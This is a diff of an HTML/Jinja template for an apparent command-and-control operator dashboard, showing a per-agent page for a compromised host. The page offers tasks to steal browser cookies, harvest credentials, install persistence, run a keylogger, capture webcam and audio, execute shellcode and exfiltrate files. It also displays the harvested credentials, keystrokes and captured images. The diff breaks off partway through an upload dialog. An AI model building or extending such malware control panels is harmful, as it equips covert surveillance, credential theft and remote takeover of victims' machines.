@@ -1,260 +1,283 @@
 {% extends "base.html" %}
+{% from "macros.html" import icon, status_badge, priv_badge %}
+
+{% block title %}Agent {{ agent.hostname }}{% endblock %}
 
 {% block content %}
-<div class="container-fluid mt-5"> 
-    <div class="d-flex justify-content-between align-items-center mb-4">
-        <h2>
-            <i class="fas fa-robot me-2"></i><span id="agent-hostname">{{ agent.hostname }}</span>
-            <span id="agent-status" class="badge bg-{% if agent.status == 'online' %}success{% elif agent.status == 'inactive' %}warning{% else %}danger{% endif %}">
-            {{ agent.status|capitalize }}
-        </span>
-        </h2>
-        <div>
-            <a href="{{ base_url }}{{ url_for('terminal', agent_id=agent.id) }}" class="btn btn-primary me-2">
-                <i class="fas fa-terminal me-1"></i>Terminal
-            </a>
-            <a href="{{ base_url }}{{ url_for('remote_desktop', agent_id=agent.id) }}" class="btn btn-success me-2">
-                <i class="fas fa-desktop me-1"></i>Remote Desktop
-            </a>
-            <button id="killAgent" class="btn btn-danger me-2">
-                <i class="fas fa-skull me-1"></i>Kill Agent
-            </button>
-            <button id="manualRefresh" class="btn btn-outline-primary">
-                <i class="fas fa-sync-alt me-1"></i>Refresh
-            </button>
+<div class="space-y-6">
+    <!-- Tactical Header -->
+    <div class="tactical-card p-5">
+        <div class="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
+            <div class="flex items-start sm:items-center gap-4">
+                <div class="w-12 h-12 rounded-xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-emerald-400 shrink-0">
+                    {{ icon('agents', 'w-6 h-6') }}
+                </div>
+                <div>
+                    <div class="flex flex-wrap items-center gap-2.5">
+                        <h1 class="text-2xl font-bold tracking-tight text-slate-100" id="agent-hostname">{{ agent.hostname }}</h1>
+                        {{ status_badge(agent.status, id="agent-status") }}
+                        {{ priv_badge(agent.privilege, id="agent-privilege") }}
+                    </div>
+                    <p class="text-xs font-mono text-slate-400 mt-1">
+                        ID: <span id="agent-id" class="text-slate-300">{{ agent.id }}</span> &bull;
+                        IP: <span id="agent-ip" class="text-cyan-400">{{ agent.ip }}</span>
+                    </p>
+                </div>
+            </div>
+
+            <div class="flex flex-wrap items-center gap-2.5">
+                <a href="{{ base_url }}{{ url_for('terminal', agent_id=agent.id) }}" class="tactical-btn-primary">
+                    {{ icon('terminal', 'w-4 h-4') }}
+                    <span>Terminal</span>
+                </a>
+                <a href="{{ base_url }}{{ url_for('remote_desktop', agent_id=agent.id) }}" class="tactical-btn-cyan">
+                    {{ icon('desktop', 'w-4 h-4') }}
+                    <span>Remote Desktop</span>
+                </a>
+                <button type="button" id="manualRefresh" class="tactical-btn-secondary">
+                    {{ icon('refresh', 'w-4 h-4') }}
+                    <span>Refresh</span>
+                </button>
+                <button type="button" id="killAgent" class="tactical-btn-danger">
+                    {{ icon('skull', 'w-4 h-4') }}
+                    <span>Kill Agent</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Telemetry Metadata Bar -->
+        <div id="agent-info-section" class="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-5 pt-5 border-t border-slate-800/80">
+            <div class="p-3 rounded-xl bg-slate-950/60 border border-slate-800/70">
+                <p class="text-[11px] font-semibold uppercase tracking-wider text-slate-500">Operating System</p>
+                <p id="agent-os" class="text-sm font-medium text-slate-200 mt-1 truncate">{{ agent.os }}</p>
+            </div>
+            <div class="p-3 rounded-xl bg-slate-950/60 border border-slate-800/70">
+                <p class="text-[11px] font-semibold uppercase tracking-wider text-slate-500">Last Check-in</p>
+                <p id="agent-last-seen" class="text-sm font-mono text-slate-200 mt-1">{{ agent.last_seen }}</p>
+            </div>
+            <div class="p-3 rounded-xl bg-slate-950/60 border border-slate-800/70">
+                <p class="text-[11px] font-semibold uppercase tracking-wider text-slate-500">Beacon Interval</p>
+                <p class="text-sm font-mono text-slate-200 mt-1"><span id="agent-checkin_interval">{{ agent.checkin_interval }}</span>s</p>
+            </div>
+            <div class="p-3 rounded-xl bg-slate-950/60 border border-slate-800/70">
+                <p class="text-[11px] font-semibold uppercase tracking-wider text-slate-500">Kill Date</p>
+                <p id="agent-killdate" class="text-sm font-mono text-slate-200 mt-1">{{ agent.killdate or 'Disabled' }}</p>
+            </div>
         </div>
     </div>
 
-
-    <div class="row">
-        <div class="col-md-6">
-            <div class="card shadow-sm mb-4">
-                <div class="card-header">
-                    <h5 class="mb-0">Agent Information</h5>
-                </div>
-                <div class="card-body" id="agent-info-section">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <p><strong>Agent ID:</strong> <span id="agent-id">{{ agent.id }}</span></p>
-                            <p><strong>IP Address:</strong> <span id="agent-ip">{{ agent.ip }}</span></p>
-                        </div>
-                        <div class="col-md-6">
-                            <p><strong>Operating System:</strong> <span id="agent-os">{{ agent.os }}</span></p>
-                            <p><strong>Privilege Level:</strong> 
-                                <span id="agent-privilege" class="badge bg-{% if agent.privilege == 'admin' %}danger{% else %}warning{% endif %}">
-                                    {{ agent.privilege|capitalize }}
-                                </span>
-                            </p>
-                        </div>
+    <!-- Main 2-Column Workspace -->
+    <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+        <!-- Left Column: Visual Intelligence (Screenshots & Webcam) -->
+        <div class="lg:col-span-5 space-y-6">
+            <!-- Recent Screenshots -->
+            <div class="tactical-card">
+                <div class="tactical-card-header">
+                    <div class="flex items-center gap-2.5">
+                        <span class="text-emerald-400">{{ icon('camera', 'w-5 h-5') }}</span>
+                        <h2 class="text-base font-semibold text-slate-100">Recent Screenshots</h2>
                     </div>
-                    <p><strong>Last Seen:</strong> <span id="agent-last-seen">{{ agent.last_seen }}</span></p>
-                    <p><strong>Killdate:</strong> <span id="agent-killdate">{{ agent.killdate }}</span></p>
-                    <p><strong>Checkin Interval:</strong> <span id="agent-checkin_interval">{{ agent.checkin_interval }}</span></p>
-                </div>
-            </div>
-
-            <div class="card shadow-sm mb-4">
-                <div class="card-header d-flex justify-content-between align-items-center">
-                    <h5 class="mb-0">Recent Screenshots</h5>
-                    <a href="{{ base_url }}{{ url_for('screenshots') }}?agent_id={{ agent.id }}" class="btn btn-sm btn-outline-primary">
-                        View All
+                    <a href="{{ base_url }}{{ url_for('screenshots') }}?agent_id={{ agent.id }}" class="tactical-btn-ghost">
+                        View All &rarr;
                     </a>
                 </div>
-                <div class="card-body" id="screenshots-section">
+                <div class="p-5" id="screenshots-section">
                     {% if screenshots %}
-                    <div class="row" id="screenshots-container">
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4" id="screenshots-container">
                         {% for screenshot in screenshots %}
-                        <div class="col-md-6 mb-3">
-                            <a href="{{ base_url }}{{ url_for('get_screenshot', screenshot_id=screenshot.id) }}" data-lightbox="screenshots-{{ agent.id }}">
-                                <img src="{{ base_url }}{{ url_for('get_screenshot', screenshot_id=screenshot.id) }}" class="img-fluid rounded" alt="Screenshot">
+                        <div class="group relative rounded-xl overflow-hidden bg-slate-950 border border-slate-800">
+                            <a href="{{ base_url }}{{ url_for('get_screenshot', screenshot_id=screenshot.id) }}"
+                               data-lightbox="screenshots-{{ agent.id }}"
+                               data-title="Screenshot — {{ screenshot.timestamp }}"
+                               class="block aspect-video overflow-hidden">
+                                <img src="{{ base_url }}{{ url_for('get_screenshot', screenshot_id=screenshot.id) }}"
+                                     class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-200"
+                                     alt="Screenshot">
                             </a>
-                            <p class="small text-muted mt-1">{{ screenshot.timestamp }}</p>
+                            <div class="px-3 py-2 bg-slate-900/90 border-t border-slate-800 flex items-center justify-between">
+                                <p class="text-[11px] font-mono text-slate-400">{{ screenshot.timestamp }}</p>
+                            </div>
                         </div>
                         {% endfor %}
                     </div>
                     {% else %}
-                    <p class="text-muted">No screenshots available</p>
+                    <p class="text-sm text-slate-500 text-center py-6">No screenshots available for this agent</p>
                     {% endif %}
                 </div>
             </div>
 
-            <div class="card shadow-sm mb-4">
-                <div class="card-header d-flex justify-content-between align-items-center">
-                    <h5 class="mb-0">Recent Webcam Captures</h5>
-                    <a href="{{ base_url }}{{ url_for('webcam_captures') }}?agent_id={{ agent.id }}" class="btn btn-sm btn-outline-primary">
-                        View All
+            <!-- Recent Webcam Captures -->
+            <div class="tactical-card">
+                <div class="tactical-card-header">
+                    <div class="flex items-center gap-2.5">
+                        <span class="text-cyan-400">{{ icon('webcam', 'w-5 h-5') }}</span>
+                        <h2 class="text-base font-semibold text-slate-100">Recent Webcam Captures</h2>
+                    </div>
+                    <a href="{{ base_url }}{{ url_for('webcam_captures') }}?agent_id={{ agent.id }}" class="tactical-btn-ghost">
+                        View All &rarr;
                     </a>
                 </div>
-                <div class="card-body" id="webcam-section">
+                <div class="p-5" id="webcam-section">
                     {% if webcam_captures %}
-                    <div class="row" id="webcam-container">
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4" id="webcam-container">
                         {% for capture in webcam_captures %}
-                        <div class="col-md-6 mb-3">
-                            <a href="{{ base_url }}{{ url_for('get_webcam_capture', capture_id=capture.id) }}" data-lightbox="webcam-{{ agent.id }}">
-                                <img src="{{ base_url }}{{ url_for('get_webcam_capture', capture_id=capture.id) }}" class="img-fluid rounded" alt="Webcam Capture">
+                        <div class="group relative rounded-xl overflow-hidden bg-slate-950 border border-slate-800">
+                            <a href="{{ base_url }}{{ url_for('get_webcam_capture', capture_id=capture.id) }}"
+                               data-lightbox="webcam-{{ agent.id }}"
+                               data-title="Webcam Capture — {{ capture.timestamp }}"
+                               class="block aspect-video overflow-hidden">
+                                <img src="{{ base_url }}{{ url_for('get_webcam_capture', capture_id=capture.id) }}"
+                                     class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-200"
+                                     alt="Webcam Capture">
                             </a>
-                            <p class="small text-muted mt-1">{{ capture.timestamp }}</p>
+                            <div class="px-3 py-2 bg-slate-900/90 border-t border-slate-800 flex items-center justify-between">
+                                <p class="text-[11px] font-mono text-slate-400">{{ capture.timestamp }}</p>
+                            </div>
                         </div>
                         {% endfor %}
                     </div>
                     {% else %}
-                    <p class="text-muted">No webcam captures available</p>
+                    <p class="text-sm text-slate-500 text-center py-6">No webcam captures available for this agent</p>
                     {% endif %}
                 </div>
             </div>
         </div>
 
-        <div class="col-md-6">
-            <div class="card shadow-sm mb-4">
-                <div class="card-header d-flex justify-content-between align-items-center">
-                    <h5 class="mb-0">Recent Tasks</h5>
-                    <div class="d-flex align-items-center">
-                        <select id="taskType" class="form-select form-select-sm me-2" required>
-                            <option value="">Select Task</option>
-                            <option value="steal_cookies">Steal Cookies</option>
+        <!-- Right Column: Task Dispatch, Recent Tasks, Credentials & Keylogger -->
+        <div class="lg:col-span-7 space-y-6">
+            <!-- Task Dispatch & Queue -->
+            <div class="tactical-card">
+                <div class="tactical-card-header flex-col xl:flex-row items-stretch xl:items-center">
+                    <div class="flex items-center justify-between gap-2.5">
+                        <div class="flex items-center gap-2.5">
+                            <span class="text-emerald-400">{{ icon('terminal', 'w-5 h-5') }}</span>
+                            <h2 class="text-base font-semibold text-slate-100">Task Dispatch & History</h2>
+                        </div>
+                        <span id="keyloggerStatusBadge" class="px-2.5 py-1 rounded-full text-xs font-mono bg-slate-800 text-slate-300 border border-slate-700">
+                            Keylogger Status: Unknown
+                        </span>
+                    </div>
+
+                    <div class="flex flex-wrap sm:flex-nowrap items-center gap-2">
+                        <select id="taskType" class="tactical-select flex-1 sm:w-60 text-xs" required>
+                            <option value="">Select Task Operation...</option>
+                            <option value="shell">Execute Command (Shell)</option>
                             <option value="screenshot">Take Screenshot</option>
                             <option value="webcam">Capture Webcam</option>
                             <option value="audio_capture">Capture Audio</option>
                             <option value="harvest_creds">Harvest Credentials</option>
-                            <option value="shell">Execute Command</option>
+                            <option value="steal_cookies">Steal Browser Cookies</option>
                             <option value="persist">Install Persistence</option>
-                            <option value="shellcode">Shellcode-Runner</option>
+                            <option value="shellcode">Shellcode Runner (PE/Raw)</option>
                             <option value="keylogger_start">Start Keylogger</option>
                             <option value="keylogger_stop">Stop Keylogger</option>
                             <option value="arsenal_upload">Arsenal Upload (Arsenal -> Agent)</option>
                             <option value="upload">Exfiltrate File (Agent -> C2)</option>
                         </select>
-                        <button id="executeTask" class="btn btn-sm btn-primary me-3">Execute</button>
-                        <span id="keyloggerStatusBadge" class="badge bg-secondary">Keylogger Status: Unknown</span>
+                        <button type="button" id="executeTask" class="tactical-btn-primary py-2 px-4 text-xs shrink-0">
+                            {{ icon('send', 'w-3.5 h-3.5') }}
+                            <span>Execute</span>
+                        </button>
                     </div>
                 </div>
-                <div class="card-body">
-                    <div class="table-responsive">
-                        <table class="table table-sm">
-                            <thead>
-                                <tr>
-                                    <th>Type</th>
-                                    <th>Status</th>
-                                    <th>Created</th>
-                                    <th>Completed</th>
-                                    <th>Actions</th>
-                                </tr>
-                            </thead>
-                            <tbody id="tasks-container">
-                                {% if tasks %}
-                                {% for task in tasks %}
-                                <tr>
-                                    <td>
-                                        <span class="badge bg-{{ 'info' if task.task_type == 'shell' else 'primary' }}">
-                                            {{ task.task_type }}
-                                        </span>
-                                    </td>
-                                    <td>
-                                        <span class="badge bg-{{ 'primary' if task.status == 'pending' else 'warning' if task.status == 'executing' else 'success' }}">
-                                            {{ task.status }}
-                                        </span>
-                                    </td>
-                                    <td>{{ task.created_at }}</td>
-                                    <td>{{ task.completed_at if task.completed_at else '-' }}</td>
-                                    <td>
-                                        <button class="btn btn-sm btn-outline-secondary" data-bs-toggle="modal" data-bs-target="#taskModal{{ task.id }}" data-agent-id="{{ agent.id }}">
-                                            <i class="fas fa-info-circle"></i>
-                                        </button>
-                                    </td>
-                                </tr>
 
-                                <!-- Task Detail Modal -->
-                                <div class="modal fade" id="taskModal{{ task.id }}" tabindex="-1">
-                                    <div class="modal-dialog modal-lg">
-                                        <div class="modal-content">
-                                            <div class="modal-header">
-                                                <h5 class="modal-title">Task #{{ task.id }} Details</h5>
-                                                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
-                                            </div>
-                                            <div class="modal-body">
-                                                <div class="mb-3">
-                                                    <h6>Task Data</h6>
-                                                    <pre class="bg-light p-3">{{ task.task_data|tojson|safe }}</pre>
-                                                </div>
-                                                <div class="mb-3">
-                                                    <h6>Status</h6>
-                                                    <span class="badge bg-{{ 'primary' if task.status == 'pending' else 'warning' if task.status == 'executing' else 'success' }}">
-                                                        {{ task.status }}
-                                                    </span>
-                                                </div>
-                                                {% if task.task_type == 'shellcode' %}
-                                                <div class="mb-3">
-                                                    <h6>Shellcode Output</h6>
-                                                    <div id="shellcode-output-{{ task.id }}" class="shellcode-output-container">
-                                                        <div class="text-center">
-                                                            <div class="spinner-border spinner-border-sm" role="status">
-                                                                <span class="visually-hidden">Loading...</span>
-                                                            </div>
-                                                            <small class="text-muted">Loading shellcode output...</small>
-                                                        </div>
-                                                    </div>
-                                                </div>
-                                                {% endif %}
-                                            </div>
-                                            <div class="modal-footer">
-                                                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-                                            </div>
-                                        </div>
-                                    </div>
-                                </div>
-                                {% endfor %}
-                                {% else %}
-                                <tr>
-                                    <td colspan="5" class="text-muted">No tasks found</td>
-                                </tr>
-                                {% endif %}
-                            </tbody>
-                        </table>
-                    </div>
+                <div class="overflow-x-auto">
+                    <table class="tactical-table">
+                        <thead>
+                            <tr>
+                                <th>Type</th>
+                                <th>Status</th>
+                                <th>Created</th>
+                                <th>Completed</th>
+                                <th class="text-right">Details</th>
+                            </tr>
+                        </thead>
+                        <tbody id="tasks-container">
+                            {% if tasks %}
+                            {% for task in tasks %}
+                            <tr>
+                                <td>
+                                    <span class="px-2.5 py-0.5 rounded-md text-xs font-mono font-medium {% if task.task_type == 'shell' %}bg-cyan-500/15 text-cyan-300 border border-cyan-500/30{% else %}bg-slate-800 text-slate-200 border border-slate-700{% endif %}">
+                                        {{ task.task_type }}
+                                    </span>
+                                </td>
+                                <td>{{ status_badge(task.status) }}</td>
+                                <td class="font-mono text-xs text-slate-400">{{ task.created_at }}</td>
+                                <td class="font-mono text-xs text-slate-400">{{ task.completed_at if task.completed_at else '-' }}</td>
+                                <td class="text-right">
+                                    <button type="button"
+                                            class="tactical-btn-ghost"
+                                            data-modal-target="#taskModal{{ task.id }}"
+                                            data-bs-toggle="modal"
+                                            data-bs-target="#taskModal{{ task.id }}"
+                                            data-agent-id="{{ agent.id }}">
+                                        {{ icon('info', 'w-4 h-4') }}
+                                    </button>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                            {% else %}
+                            <tr>
+                                <td colspan="5" class="text-center py-8 text-slate-500">No tasks queued for this agent</td>
+                            </tr>
+                            {% endif %}
+                        </tbody>
+                    </table>
                 </div>
             </div>
 
-            <div class="card shadow-sm">
-                <div class="card-header">
-                    <h5 class="mb-0">Recent Credentials</h5>
-                </div>
-                <div class="card-body">
-                    <div class="table-responsive">
-                        <table class="table table-sm">
-                            <thead>
-                                <tr>
-                                    <th>Browser</th>
-                                    <th>URL</th>
-                                    <th>Username</th>
-                                </tr>
-                            </thead>
-                            <tbody id="creds-container">
-                                {% if creds %}
-                                {% for cred in creds %}
-                                <tr>
-                                    <td><span class="badge bg-primary">{{ cred.browser|capitalize }}</span></td>
-                                    <td>{{ cred.url|truncate(30) }}</td>
-                                    <td>{{ cred.username|truncate(20) }}</td>
-                                </tr>
-                                {% endfor %}
-                                {% else %}
-                                <tr>
-                                    <td colspan="3" class="text-muted">No credentials found</td>
-                                </tr>
-                                {% endif %}
-                            </tbody>
-                        </table>
+            <!-- Recent Credentials -->
+            <div class="tactical-card">
+                <div class="tactical-card-header">
+                    <div class="flex items-center gap-2.5">
+                        <span class="text-cyan-400">{{ icon('key', 'w-5 h-5') }}</span>
+                        <h2 class="text-base font-semibold text-slate-100">Harvested Credentials</h2>
                     </div>
+                    <a href="{{ url_for('credentials') }}" class="tactical-btn-ghost">Open Loot Vault &rarr;</a>
+                </div>
+                <div class="overflow-x-auto">
+                    <table class="tactical-table">
+                        <thead>
+                            <tr>
+                                <th>Source</th>
+                                <th>URL / Target</th>
+                                <th>Username</th>
+                            </tr>
+                        </thead>
+                        <tbody id="creds-container">
+                            {% if creds %}
+                            {% for cred in creds %}
+                            <tr>
+                                <td>
+                                    <span class="px-2.5 py-0.5 rounded-md text-xs font-medium bg-cyan-500/15 text-cyan-300 border border-cyan-500/30">
+                                        {{ cred.browser|capitalize }}
+                                    </span>
+                                </td>
+                                <td class="font-mono text-xs text-slate-300">{{ cred.url|truncate(40) }}</td>
+                                <td class="font-mono text-xs text-emerald-300">{{ cred.username|truncate(25) }}</td>
+                            </tr>
+                            {% endfor %}
+                            {% else %}
+                            <tr>
+                                <td colspan="3" class="text-center py-6 text-slate-500">No credentials harvested from this agent</td>
+                            </tr>
+                            {% endif %}
+                        </tbody>
+                    </table>
                 </div>
             </div>
 
-            <div class="card shadow-sm mt-4">
-                <div class="card-header">
-                    <h5 class="mb-0">Keylogger Logs</h5>
+            <!-- Keylogger Stream -->
+            <div class="tactical-card">
+                <div class="tactical-card-header">
+                    <div class="flex items-center gap-2.5">
+                        <span class="text-amber-400">{{ icon('terminal', 'w-5 h-5') }}</span>
+                        <h2 class="text-base font-semibold text-slate-100">Keylogger Stream</h2>
+                    </div>
                 </div>
-                <div class="card-body" style="max-height: 300px; overflow-y: auto;">
-                    <ul id="keyloggerLogs" class="list-group list-group-flush">
-                        <li class="list-group-item text-muted">Loading keylogger logs...</li>
+                <div class="p-4 max-h-72 overflow-y-auto bg-slate-950/80">
+                    <ul id="keyloggerLogs" class="space-y-1.5 font-mono text-xs">
+                        <li class="text-slate-500">Loading keylogger logs...</li>
                     </ul>
                 </div>
             </div>
@@ -262,351 +285,320 @@
     </div>
 </div>
 
-<!-- Shellcode modal -->
-<div class="modal fade" id="shellcodeModal" tabindex="-1">
-    <div class="modal-dialog">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h5 class="modal-title">Shellcode Runner</h5>
-                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+<!-- Task Detail Modals -->
+{% for task in tasks %}
+<div class="glycon-modal modal fixed inset-0 z-50 hidden items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm" id="taskModal{{ task.id }}" tabindex="-1">
+    <div class="bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl max-w-2xl w-full overflow-hidden">
+        <div class="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/50">
+            <h3 class="text-base font-semibold text-slate-100">Task #{{ task.id }} Details</h3>
+            <button type="button" data-modal-close class="text-slate-400 hover:text-slate-100 p-1.5 rounded-lg hover:bg-slate-800">
+                {{ icon('close', 'w-5 h-5') }}
+            </button>
+        </div>
+        <div class="p-6 space-y-4 max-h-[75vh] overflow-y-auto">
+            <div class="flex items-center justify-between">
+                <span class="text-xs font-semibold uppercase tracking-wider text-slate-400">Status</span>
+                {{ status_badge(task.status) }}
             </div>
-            <div class="modal-body">
-                <div class="mb-3">
-                    <label class="form-label">Input Type</label>
-                    <div class="form-check">
-                        <input class="form-check-input" type="radio" name="shellcodeType" id="shellcodeFileType" value="file" checked>
-                        <label class="form-check-label" for="shellcodeFileType">
-                            PE File (EXE/DLL)
+            <div>
+                <h4 class="text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Task Data</h4>
+                <pre class="p-4 rounded-xl bg-slate-950 border border-slate-800 text-xs font-mono text-emerald-300 overflow-x-auto whitespace-pre-wrap break-all">{{ task.task_data|tojson }}</pre>
+            </div>
+            {% if task.task_type == 'shellcode' %}
+            <div>
+                <h4 class="text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Shellcode Output</h4>
+                <div id="shellcode-output-{{ task.id }}" class="p-4 rounded-xl bg-slate-950 border border-slate-800 text-xs font-mono text-slate-300">
+                    <span class="text-slate-500">Loading shellcode output...</span>
+                </div>
+            </div>
+            {% endif %}
+        </div>
+        <div class="px-6 py-3.5 bg-slate-950/60 border-t border-slate-800 flex justify-end">
+            <button type="button" data-modal-close class="tactical-btn-secondary">Close</button>
+        </div>
+    </div>
+</div>
+{% endfor %}
+
+<!-- Shellcode Runner Modal -->
+<div class="glycon-modal modal fixed inset-0 z-50 hidden items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm" id="shellcodeModal" tabindex="-1">
+    <div class="bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl max-w-lg w-full overflow-hidden">
+        <div class="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/50">
+            <div class="flex items-center gap-2.5">
+                <span class="text-emerald-400">{{ icon('terminal', 'w-5 h-5') }}</span>
+                <h3 class="text-base font-semibold text-slate-100">Shellcode Runner</h3>
+            </div>
+            <button type="button" data-modal-close class="text-slate-400 hover:text-slate-100 p-1.5 rounded-lg hover:bg-slate-800">
+                {{ icon('close', 'w-5 h-5') }}
+            </button>
+        </div>
+        <div class="p-6 space-y-4">
+            <div>
+                <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Input Format</label>
+                <div class="grid grid-cols-2 gap-3">
+                    <label class="flex items-center gap-2.5 p-3 rounded-xl bg-slate-950 border border-slate-800 cursor-pointer hover:border-slate-700">
+                        <input type="radio" name="shellcodeType" id="shellcodeFileType" value="file" checked class="text-emerald-500 focus:ring-emerald-500/30">
+                        <span class="text-sm font-medium text-slate-200">PE File (EXE/DLL)</span>
+                    </label>
+                    <label class="flex items-center gap-2.5 p-3 rounded-xl bg-slate-950 border border-slate-800 cursor-pointer hover:border-slate-700">
+                        <input type="radio" name="shellcodeType" id="shellcodeRawType" value="raw" class="text-emerald-500 focus:ring-emerald-500/30">
+                        <span class="text-sm font-medium text-slate-200">Raw Shellcode</span>
+                    </label>
+                </div>
+            </div>
+
+            <div id="fileInputSection">
+                <label for="shellcodeFile" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">PE Binary File</label>
+                <input type="file" id="shellcodeFile" class="tactical-input file:mr-4 file:py-1 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-emerald-500/15 file:text-emerald-400">
+            </div>
+
+            <div id="rawInputSection" class="hidden space-y-4">
+                <div>
+                    <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Raw Shellcode Method</label>
+                    <div class="grid grid-cols-2 gap-3">
+                        <label class="flex items-center gap-2 p-2.5 rounded-xl bg-slate-950 border border-slate-800 cursor-pointer">
+                            <input type="radio" name="rawInputMethod" id="rawFileMethod" value="file" checked class="text-emerald-500">
+                            <span class="text-xs font-medium text-slate-200">Upload .bin File</span>
+                        </label>
+                        <label class="flex items-center gap-2 p-2.5 rounded-xl bg-slate-950 border border-slate-800 cursor-pointer">
+                            <input type="radio" name="rawInputMethod" id="rawTextMethod" value="text" class="text-emerald-500">
+                            <span class="text-xs font-medium text-slate-200">Paste Hex String</span>
                         </label>
                     </div>
-                    <div class="form-check">
-                        <input class="form-check-input" type="radio" name="shellcodeType" id="shellcodeRawType" value="raw">
-                        <label class="form-check-label" for="shellcodeRawType">
-                            Raw Shellcode
-                        </label>
-                    </div>
                 </div>
-                
-                <div class="mb-3" id="fileInputSection">
-                    <label for="shellcodeFile" class="form-label">Binary File</label>
-                    <input class="form-control" type="file" id="shellcodeFile" required>
+
+                <div id="rawFileUploadSection">
+                    <label for="rawShellcodeFile" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Shellcode Binary File</label>
+                    <input type="file" id="rawShellcodeFile" class="tactical-input file:mr-4 file:py-1 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-emerald-500/15 file:text-emerald-400">
                 </div>
-                
-                <div class="mb-3 d-none" id="rawInputSection">
-                    <div class="mb-3">
-                        <label class="form-label">Raw Shellcode Input Method</label>
-                        <div class="form-check">
-                            <input class="form-check-input" type="radio" name="rawInputMethod" id="rawFileMethod" value="file" checked>
-                            <label class="form-check-label" for="rawFileMethod">
-                                Upload Binary File
-                            </label>
-                        </div>
-                        <div class="form-check">
-                            <input class="form-check-input" type="radio" name="rawInputMethod" id="rawTextMethod" value="text">
-                            <label class="form-check-label" for="rawTextMethod">
-                                Paste Hex Code
-                            </label>
-                        </div>
-                    </div>
-                    
-                    <div class="mb-3" id="rawFileUploadSection">
-                        <label for="rawShellcodeFile" class="form-label">Shellcode Binary File</label>
-                        <input class="form-control" type="file" id="rawShellcodeFile">
-                    </div>
-                    
-                    <div class="mb-3 d-none" id="rawTextInputSection">
-                        <label for="shellcodeHex" class="form-label">Hex Shellcode</label>
-                        <textarea class="form-control" id="shellcodeHex" rows="5" placeholder="Paste shellcode in hex format (e.g., fc4883e4...)"></textarea>
-                    </div>
-                </div>
-                
-                <div class="mb-3">
-                    <label for="shellcodeArgs" class="form-label">Arguments</label>
-                    <input type="text" class="form-control" id="shellcodeArgs" placeholder="Optional arguments">
+
+                <div id="rawTextInputSection" class="hidden">
+                    <label for="shellcodeHex" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Hex Shellcode</label>
+                    <textarea id="shellcodeHex" rows="4" class="tactical-input font-mono text-xs" placeholder="fc4883e4f0e8c0000000..."></textarea>
                 </div>
             </div>
-            <div class="modal-footer">
-                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
-                <button type="button" class="btn btn-primary" id="sendShellcode">Send</button>
+
+            <div>
+                <label for="shellcodeArgs" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Execution Arguments (Optional)</label>
+                <input type="text" id="shellcodeArgs" class="tactical-input font-mono" placeholder="Optional command-line arguments">
             </div>
+        </div>
+        <div class="px-6 py-3.5 bg-slate-950/60 border-t border-slate-800 flex items-center justify-end gap-2.5">
+            <button type="button" data-modal-close class="tactical-btn-secondary">Cancel</button>
+            <button type="button" id="sendShellcode" class="tactical-btn-primary">
+                {{ icon('send', 'w-4 h-4') }}
+                <span>Dispatch Shellcode</span>
+            </button>
         </div>
     </div>
 </div>
 
 <!-- Upload File Modal -->
-<div class="modal fade" id="uploadFileModal" tabindex="-1">
-    <div class="modal-dialog">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h5 class="modal-title">Upload File to Agent</h5>
-                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+<div class="glycon-modal modal fixed inset-0 z-50 hidden items-center justify-center p-4 bg-slate-950/80 backdrop-blur-sm" id="uploadFileModal" tabindex="-1">
+    <div class="bg-slate-900 border border-slate-800 rounded-2xl shadow-2xl max-w-md w-full overflow-hidden">
+        <div class="px-6 py-4 border-b border-slate-800 flex items-center justify-between bg-slate-950/50">
+            <h3 class="text-base font-semibold text-slate-100">Upload File to Agent</h3>
+            <button type="button" data-modal-close class="text-slate-400 hover:text-slate-100 p-1.5 rounded-lg hover:bg-slate-800">
+                {{ icon('close', 'w-5 h-5') }}
+            </button>
+        </div>
+        <div class="p-6 space-y-4">
+            <div>
+                <label for="uploadFileInput" class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Select File</label>
+                <input type="file" id="uploadFileInput" class="tactical-input" required>
             </div>
-            <div class="modal-body">
-                <div class="mb-3">
-                    <label for="uploadFileInput" class="form-label">Select File</label>
-                    <input class="form-control" type="file" id="uploadFileInput" required>
-                </div>
-                <div class="mb-3">
-                    <label for="uploadDestinationFolder" class="form-label">Destination Folder</label>
-                    <input type="text" class="form-control" id="uploadDestinationFolder" placeholder="e.g., C:\Users\Public or %USERPROFILE%\Documents" value="%USERPROFILE%\Downloads">
-                    <small class="text-muted">Full path where the file should be saved on the agent</small>
-                </div>
-                <div class="mb-3">
-                    <label for="uploadFileName" class="form-label">File Name (optional)</label>
-                    <input type="text" class="form-control" id="uploadFileName" placeholder="Leave empty to use original filename">
